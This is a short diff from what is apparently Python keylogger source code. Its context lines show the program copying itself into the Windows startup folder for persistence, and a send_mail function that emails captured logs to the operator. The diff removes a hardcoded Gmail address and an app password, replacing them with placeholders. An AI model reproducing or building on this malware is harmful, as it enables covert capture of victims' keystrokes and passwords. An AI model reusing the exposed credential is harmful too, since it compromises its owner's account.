@@ -15,9 +15,9 @@ if not path.exists(start_up_path + '\KeyLogger'):
     shutil.move(os.getcwd(), start_up_path) #move file to startup folder
 
 def send_mail(subject, file_name):
-    sender_mail = 'mutenssj@gmail.com'
+    sender_mail = '' #here goes your email
     receiver_mail = sender_mail
-    pwd = 'yetzdcskhygwabrn'
+    pwd = '' #here goes your third party app password
 
     mail = Mailer(email = sender_mail, password = pwd)
 
